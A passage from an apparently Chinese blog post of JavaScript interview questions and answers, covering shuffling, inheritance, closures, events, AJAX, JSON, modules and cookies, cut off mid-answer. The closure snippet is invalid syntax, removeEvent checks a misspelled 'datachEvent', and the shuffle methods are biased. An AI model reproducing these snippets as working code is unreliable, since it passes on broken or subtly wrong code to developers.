class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">commafy</span>(<span class="params">num</span>)</span>&#123;</div><div class="line"><span class="keyword">return</span> num &amp;&amp; num</div><div class="line">.toString()</div><div class="line">.replace(<span class="regexp">/(\d)(?=(\d&#123;3&#125;)+\.)/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$<span class="number">1</span>, $<span class="number">2</span></span>)</span>&#123;</div><div class="line"><span class="keyword">return</span> $<span class="number">2</span> + <span class="string">','</span>;</div><div class="line">&#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>八、如何实现数组的随机排序？</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//方法一：</span></div><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</div><div class="line">function randSort1(arr)&#123;</div><div class="line">for(var i = <span class="number">0</span>,len = arr.length;i &lt; len; i++ )&#123;</div><div class="line">var rand = parseInt(Math.random()*len);</div><div class="line">var temp = arr[rand];</div><div class="line">arr[rand] = arr[i];</div><div class="line">arr[i] = temp;</div><div class="line">&#125;</div><div class="line">return arr;</div><div class="line">&#125;</div><div class="line">console.log(randSort1(arr));</div><div class="line"></div><div class="line"><span class="comment">//方法二：</span></div><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</div><div class="line">function randSort2(arr)&#123;</div><div class="line">var mixedArray = [];</div><div class="line">while(arr.length &gt; <span class="number">0</span>)&#123;</div><div class="line">var randomIndex = parseInt(Math.random()*arr.length);</div><div class="line">mixedArray.push(arr[randomIndex]);</div><div class="line">arr.splice(randomIndex, <span class="number">1</span>);</div><div class="line">&#125;</div><div class="line">return mixedArray;</div><div class="line">&#125;</div><div class="line">console.log(randSort2(arr));</div><div class="line"></div><div class="line"><span class="comment">//方法三：</span></div><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</div><div class="line">arr.sort(function()&#123;</div><div class="line">return Math.random() - <span class="number">0.5</span>;</div><div class="line">&#125;)</div><div class="line">console.log(arr);</div></pre></td></tr></table></figure><blockquote><p>九、Javascript如何实现继承？</p></blockquote><p>（1）、构造继承<br>（2）、原型继承<br>（3）、实例继承<br>（4）、拷贝继承</p><p> 原型prototype机制或apply和call方法去实现较简单，建议使用构造函数与原型混合方式。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params"></span>)</span>&#123;</div><div class="line"><span class="keyword">this</span>.name = <span class="string">'wang'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params"></span>)</span>&#123;</div><div class="line"><span class="keyword">this</span>.age = <span class="number">28</span>;</div><div class="line">&#125;</div><div class="line">Child.prototype = <span class="keyword">new</span> Parent();<span class="comment">//继承了Parent，通过原型</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> demo = <span class="keyword">new</span> Child();</div><div class="line">alert(demo.age);</div><div class="line">alert(demo.name);<span class="comment">//得到被继承的属性</span></div></pre></td></tr></table></figure></p><blockquote><p>十、JavaScript继承的几种实现方式？</p></blockquote><p>（1）、<a href="http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance.html" target="_blank" rel="external">构造函数的继承</a><br>（2）、<a href="http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance_continued.html" target="_blank" rel="external">非构造函数的继承</a></p><blockquote><p>十一、javascript创建对象的几种方式？</p></blockquote><p>javascript创建对象简单的说,无非就是使用内置对象或各种自定义对象，当然还可以用JSON；但写法有很多种，也能混合使用。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">（<span class="number">1</span>）、对象字面量的方式</div><div class="line"></div><div class="line"> person=&#123;<span class="attr">firstname</span>:<span class="string">"Mark"</span>,<span class="attr">lastname</span>:<span class="string">"Yun"</span>,<span class="attr">age</span>:<span class="number">25</span>,<span class="attr">eyecolor</span>:<span class="string">"black"</span>&#125;;</div><div class="line"></div><div class="line">（<span class="number">2</span>）、用<span class="function"><span class="keyword">function</span>来模拟无参的构造函数</span></div><div class="line"></div><div class="line"> <span class="title">function</span> <span class="title">Person</span>(<span class="params"></span>)&#123;&#125;</div><div class="line"> <span class="keyword">var</span> person=<span class="keyword">new</span> Person();<span class="comment">//定义一个function，如果使用new"实例化",该function可以看作是一个Class</span></div><div class="line"> person.name=<span class="string">"Mark"</span>;</div><div class="line"> person.age=<span class="string">"25"</span>;</div><div class="line"> person.work=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line"> alert(person.name+<span class="string">" hello..."</span>);</div><div class="line"> &#125;</div><div class="line"> person.work();</div><div class="line"></div><div class="line">（<span class="number">3</span>）、用<span class="function"><span class="keyword">function</span>来模拟参构造函数来实现（用<span class="title">this</span>关键字定义构造的上下文属性）</span></div><div class="line"></div><div class="line"> <span class="title">function</span> <span class="title">Pet</span>(<span class="params">name,age,hobby</span>)&#123;</div><div class="line">    <span class="keyword">this</span>.name=name;<span class="comment">//this作用域：当前对象</span></div><div class="line">    <span class="keyword">this</span>.age=age;</div><div class="line">    <span class="keyword">this</span>.hobby=hobby;</div><div class="line">    <span class="keyword">this</span>.eat=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">       alert(<span class="string">"我叫"</span>+<span class="keyword">this</span>.name+<span class="string">",我喜欢"</span>+<span class="keyword">this</span>.hobby+<span class="string">",是个程序员"</span>);</div><div class="line">    &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">var</span> maidou =<span class="keyword">new</span> Pet(<span class="string">"麦兜"</span>,<span class="number">25</span>,<span class="string">"coding"</span>);<span class="comment">//实例化、创建对象</span></div><div class="line"> maidou.eat();<span class="comment">//调用eat方法</span></div><div class="line"></div><div class="line"></div><div class="line">（<span class="number">4</span>）、用工厂方式来创建（内置对象）</div><div class="line"></div><div class="line">  <span class="keyword">var</span> wcDog =<span class="keyword">new</span> <span class="built_in">Object</span>();</div><div class="line">  wcDog.name=<span class="string">"旺财"</span>;</div><div class="line">  wcDog.age=<span class="number">3</span>;</div><div class="line">  wcDog.work=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    alert(<span class="string">"我是"</span>+wcDog.name+<span class="string">",汪汪汪......"</span>);</div><div class="line">  &#125;</div><div class="line">  wcDog.work();</div><div class="line"></div><div class="line"></div><div class="line">（<span class="number">5</span>）、用原型方式来创建</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">  &#125;</div><div class="line">  Dog.prototype.name=<span class="string">"旺财"</span>;</div><div class="line">  Dog.prototype.eat=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  alert(<span class="keyword">this</span>.name+<span class="string">"是个吃货"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> wangcai =<span class="keyword">new</span> Dog();</div><div class="line">  wangcai.eat();</div><div class="line"></div><div class="line"></div><div class="line">（<span class="number">6</span>）、用混合方式来创建</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Car</span>(<span class="params">name,price</span>)</span>&#123;</div><div class="line">   <span class="keyword">this</span>.name=name;</div><div class="line">   <span class="keyword">this</span>.price=price;</div><div class="line"> &#125;</div><div class="line">  Car.prototype.sell=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    alert(<span class="string">"我是"</span>+<span class="keyword">this</span>.name+<span class="string">"，我现在卖"</span>+<span class="keyword">this</span>.price+<span class="string">"万元"</span>);</div><div class="line">   &#125;</div><div class="line"> <span class="keyword">var</span> camry =<span class="keyword">new</span> Car(<span class="string">"凯美瑞"</span>,<span class="number">27</span>);</div><div class="line"> camry.sell();</div></pre></td></tr></table></figure></p><blockquote><p>十二、Javascript作用链域?</p></blockquote><p>全局函数无法查看局部函数的内部细节，但局部函数可以查看其上层的函数细节，直至全局细节。当需要从局部函数查找某一属性或方法时，如果当前作用域没有找到，就会上溯到上层作用域查找，直至全局函数，这种组织形式就是作用域链。</p><blockquote><p>十三、谈谈This对象的理解。</p></blockquote><p><code>this</code> 总是指向函数的直接调用者（而非间接调用者）；<br>如果有new关键字，<code>this</code> 指向 new 出来的那个对象；<br>在事件中，<code>this</code> 指向触发这个事件的对象，特殊的是，IE中的attachEvent中的<code>this</code> 总是指向全局对象Window；</p><blockquote><p>十三、eval是做什么的？</p></blockquote><p>它的功能是把对应的字符串解析成JS代码并运行；<br>应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）。<br>由JSON字符串转换为JSON对象的时候可以用eval，<code>var obj =eval(&#39;(&#39;+ str +&#39;)&#39;);</code></p><blockquote><p>十四、什么是window对象? 什么是document对象?</p></blockquote><p>window对象是指浏览器打开的窗口。<br>document对象是Documentd对象（HTML 文档对象）的一个只读引用，window对象的一个属性。</p><blockquote><p>十五、null，undefined 的区别？</p></blockquote><p><a href="http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html" target="_blank" rel="external">阮一峰：undefined与null的区别</a></p><blockquote><p>十六、写一个通用的事件侦听器函数。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// event(事件)工具集，来源：github.com/markyun</span></div><div class="line">markyun.Event = &#123;</div><div class="line"><span class="comment">// 页面加载完成后</span></div><div class="line">readyEvent : <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (fn==<span class="literal">null</span>) &#123;</div><div class="line">fn=<span class="built_in">document</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</div><div class="line"><span class="built_in">window</span>.onload = fn;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">oldonload();</div><div class="line">fn();</div><div class="line">&#125;;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></div><div class="line"><span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></div><div class="line">addEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.addEventListener) &#123;</div><div class="line"><span class="comment">//事件类型、需要执行的函数、是否捕捉</span></div><div class="line">element.addEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</div><div class="line">element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">handler.call(element);</div><div class="line">&#125;);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = handler;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 移除事件</span></div><div class="line">removeEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.removeEventListener) &#123;</div><div class="line">element.removeEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.datachEvent) &#123;</div><div class="line">element.detachEvent(<span class="string">'on'</span> + type, handler);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></div><div class="line">stopPropagation : <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (ev.stopPropagation) &#123;</div><div class="line">ev.stopPropagation();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">ev.cancelBubble = <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 取消事件的默认行为</span></div><div class="line">preventDefault : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (event.preventDefault) &#123;</div><div class="line">event.preventDefault();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">event.returnValue = <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取事件目标</span></div><div class="line">getTarget : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">return</span> event.target || event.srcElement;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></div><div class="line">getEvent : <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</div><div class="line"><span class="keyword">if</span> (!ev) &#123;</div><div class="line"><span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</div><div class="line"><span class="keyword">while</span> (c) &#123;</div><div class="line">ev = c.arguments[<span class="number">0</span>];</div><div class="line"><span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">c = c.caller;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ev;</div><div class="line">&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><blockquote><p>十七、[“1”, “2”, “3”].map(parseInt) 答案是多少？</p></blockquote><p>parseInt()只接受两个参数，第一个参数是数字，第二个是进制<br>这里有三个参数传进来，parseInt 就混乱了<br>结果是：[1, NaN, NaN]</p><blockquote><p>十八、事件是？IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</p></blockquote><p>（1）、我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为。<br>（2）、事件处理机制：IE是事件冒泡、Firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件；<br>（3）、<code>ev.stopPropagation();</code>（旧ie的方法<code>ev.cancelBubble = true;</code>）</p><blockquote><p>（方方-必考）十九、什么是闭包（closure），为什么要用它？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        n += <span class="number">1</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span>  adder = ()</div><div class="line">adder() <span class="comment">// n === 1</span></div><div class="line">adder() <span class="comment">// n === 2</span></div><div class="line"><span class="built_in">console</span>.log(n) <span class="comment">// n is not defined</span></div></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="external">方应航-什么是闭包</a></p><blockquote><p>二十、如何判断一个对象是否属于某个类？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">使用<span class="keyword">instanceof</span> （待完善）</div><div class="line"> <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Person)&#123;</div><div class="line">     alert(<span class="string">'yes'</span>);</div><div class="line"> &#125;</div></pre></td></tr></table></figure><blockquote><p>二十一、new操作符具体干了什么呢?</p></blockquote><p>（1）、创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。<br>（2）、属性和方法被加入到 this 引用的对象中。<br>（3）、新创建的对象由 this 所引用，并且最后隐式的返回 this 。<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var obj  = &#123;&#125;<span class="comment">;</span></div><div class="line">obj.__proto__ = Base.prototype<span class="comment">;</span></div><div class="line">Base.call(obj)<span class="comment">;</span></div></pre></td></tr></table></figure></p><blockquote><p>二十二、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？</p></blockquote><p><code>hasOwnProperty</code></p><p>javaScript中<code>hasOwnProperty</code>函数方法是返回一个布尔值，指出一个对象是否具有指定名称的属性。</p><p>此方法无法检查该对象的原型链中是否具有该属性；该属性必须是对象本身的一个成员。</p><p>使用方法：<br> <code>object.hasOwnProperty(proName)</code><br> 其中参数object是必选项。一个对象的实例。<br> proName是必选项。一个属性名称的字符串值。</p><p>如果 object 具有指定名称的属性，那么JavaScript中<code>hasOwnPropert</code>y函数方法返回 true，反之则返回 false。</p><blockquote><p>二十三、JSON 的了解？</p></blockquote><p> JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。<br> 它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小<br> 如：<code>{&quot;age&quot;:&quot;12&quot;, &quot;name&quot;:&quot;back&quot;}</code></p><p> JSON字符串转换为JSON对象:<br> <code>var obj =eval(&#39;(&#39;+ str +&#39;)&#39;);</code><br> <code>var obj = str.parseJSON();</code><br> <code>var obj = JSON.parse(str);</code></p><p> JSON对象转换为JSON字符串：<br> <code>var last=obj.toJSONString();</code><br> <code>var last=JSON.stringify(obj);</code></p><blockquote><p>二十四、js延迟加载的方式有哪些？</p></blockquote><p> defer和async、动态创建DOM方式（用得最多）、按需异步载入js</p><blockquote><p>二十五、Ajax 是什么? 如何创建一个Ajax？</p></blockquote><p>ajax的全称：Asynchronous Javascript And XML。<br>异步传输+js+xml。<br>所谓异步，在这里简单地解释就是：向服务器发送请求的时候，我们不必等待结果，而是可以同时做其他的事情，等到有了结果它自己会根据设定进行后续操作，与此同时，页面是不会发生整页刷新的，提高了用户体验。</p><p> (1)、创建XMLHttpRequest对象,也就是创建一个异步调用对象<br> (2)、创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息<br> (3)、设置响应HTTP请求状态变化的函数<br> (4)、发送HTTP请求<br> (5)、获取异步调用返回的数据<br> (6)、使用JavaScript和DOM实现局部刷新</p><blockquote><p>（方方-必考）二十六、AJAX 手写一下？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</div><div class="line">xhr.open(<span class="string">'POST'</span>, <span class="string">'/xxxx'</span>)</div><div class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(xhr.responseText)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.send(<span class="string">'a=1&amp;b=2'</span>)</div></pre></td></tr></table></figure><blockquote><p>二十七、javascript 代码中的”use strict”;是什么意思 ? 使用它区别是什么？</p></blockquote><p> (1)、use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行,</p><p> (2)、使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为。</p><p> (3)、提高编译器效率，增加运行速度；</p><p> (4)、为未来新版本的Javascript标准化做铺垫。</p><blockquote><p>二十八、Ajax 解决缓存问题？</p></blockquote><p> (1)、在ajax发送请求前加上 <code>anyAjaxObj.setRequestHeader(&quot;If-Modified-Since&quot;,&quot;0&quot;)</code>。</p><p> (2)、在ajax发送请求前加上<code>anyAjaxObj.setRequestHeader(&quot;Cache-Control&quot;,&quot;no-cache&quot;)</code>。</p><p> (3)、在URL后面加上一个随机数： <code>fresh=&quot; + Math.random()</code>;。</p><p> (4)、在URL后面加上时间戳：<code>nowtime=&quot; + new Date().getTime()</code>;。</p><p> (5)、如果是使用jQuery，直接这样就可以了 <code>$.ajaxSetup({cache:false})</code>。这样页面的所有ajax都会执行这条语句就是不需要保存缓存记录。</p><blockquote><p>二十九、同步和异步的区别?</p></blockquote><p>同步的概念应该是来自于OS中关于同步的概念:不同进程为协同完成某项工作而在先后次序上调整(通过阻塞,唤醒等方式).同步强调的是顺序性.谁先谁后.异步则不存在这种顺序性.</p><p>同步：浏览器访问服务器请求，用户看得到页面刷新，重新发请求,等请求完，页面刷新，新内容出现，用户看到新内容,进行下一步操作。</p><p>异步：浏览器访问服务器请求，用户正常操作，浏览器后端进行请求。等请求完，页面不刷新，新内容也会出现，用户看到新内容。</p><blockquote><p>三十、如何解决跨域问题?</p></blockquote><p>jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面</p><blockquote><p>三十一、服务器代理转发时，该如何处理cookie？</p></blockquote><p> nginx</p><blockquote><p>三十二、模块化开发怎么做？</p></blockquote><p><a href="http://benalman.com/news/2010/11/immediately-invoked-function-expression/" target="_blank" rel="external">立即执行函数</a>，不暴露私有成员<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　<span class="keyword">var</span> _count = <span class="number">0</span>;</div><div class="line">　　　　<span class="keyword">var</span> m1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　<span class="comment">//...</span></div><div class="line">　　　　&#125;;</div><div class="line">　　　　<span class="keyword">var</span> m2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　<span class="comment">//...</span></div><div class="line">　　　　&#125;;</div><div class="line">　　　　<span class="keyword">return</span> &#123;</div><div class="line">　　　　　　<span class="attr">m1</span> : m1,</div><div class="line">　　　　　　<span class="attr">m2</span> : m2</div><div class="line">　　　　&#125;;</div><div class="line">　　&#125;)();</div></pre></td></tr></table></figure></p><blockquote><p>三十三、AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别？</p></blockquote><p><a href="https://github.com/amdjs/amdjs-api/wiki/AMD" target="_blank" rel="external">AMD 规范</a> || <a href="https://github.com/seajs/seajs/issues/242" target="_blank" rel="external">CMD 规范在这里</a><br>区别：</p><p> (1)、对于依赖的模块，AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible.<br> (2)、CMD 推崇依赖就近，AMD 推崇依赖前置。看代码：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// CMD</span></div><div class="line"><span class="function"><span class="title">define</span><span class="params">(function(require, exports, module)</span></span>&#123;</div><div class="line">    <span class="selector-tag">var</span> <span class="selector-tag">a</span> = require(<span class="string">'./a'</span>)</div><div class="line">    <span class="selector-tag">a</span>.doSomething()</div><div class="line">    <span class="comment">// 此处略去 100 行</span></div><div class="line">    <span class="selector-tag">var</span> <span class="selector-tag">b</span> = require(<span class="string">'./b'</span>) <span class="comment">// 依赖可以就近书写</span></div><div class="line">    <span class="selector-tag">b</span>.doSomething()</div><div class="line">    <span class="comment">// ...</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="comment">// AMD 默认推荐</span></div><div class="line"><span class="function"><span class="title">define</span><span class="params">([<span class="string">'./a'</span>, <span class="string">'./b'</span>], function(a, b)</span></span>&#123; <span class="comment">// 依赖必须一开始就写好</span></div><div class="line">    <span class="selector-tag">a</span>.doSomething()</div><div class="line">    <span class="comment">// 此处略去 100 行</span></div><div class="line">    <span class="selector-tag">b</span>.doSomething()</div><div class="line">    <span class="comment">// ...</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure></p><blockquote><p>三十四、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何 缓存的？）</p></blockquote><p><a href="http://annn.me/how-to-realize-cmd-loader/" target="_blank" rel="external">详情点我</a></p><blockquote><p>三十五、&gt; 请你谈谈Cookie的弊端</p></blockquote><p><strong>优点</strong>： 极高的扩展性和可用性<br>1) 数据持久性。<br>2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。<br>3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。<br>4) 简单性。 基于文本的轻量结构。<br>5) 通过良好的编程，控制保存在 